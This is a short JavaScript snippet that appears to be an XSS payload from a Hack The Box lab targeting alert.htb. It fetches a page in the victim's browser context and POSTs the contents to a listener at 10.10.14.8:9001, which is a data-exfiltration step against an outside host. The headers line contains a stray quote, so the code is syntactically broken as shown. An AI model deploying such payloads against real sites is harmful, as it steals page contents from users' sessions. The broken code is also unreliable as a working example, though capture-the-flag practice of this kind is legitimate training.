

```javascript
async function getSite(url){
	const result = await fetch(url);
	const response = result.text();
	return response;
	
}


async function postSite(url, data)
{
	const response = await fetch(url, {
	'method':'POST',
	'mode':'no-cors',
	'headers':'{
		'Content-Type':'application/x-www-form-urlencoded'
		},
	'body':data,
		});
	const result = await response.text();
	return result;
	
}


async function test()
{
	const response = await getSite(`http://alert.htb`);
	await postSite(`http://10.10.14.8:9001`, response);
}

test();


```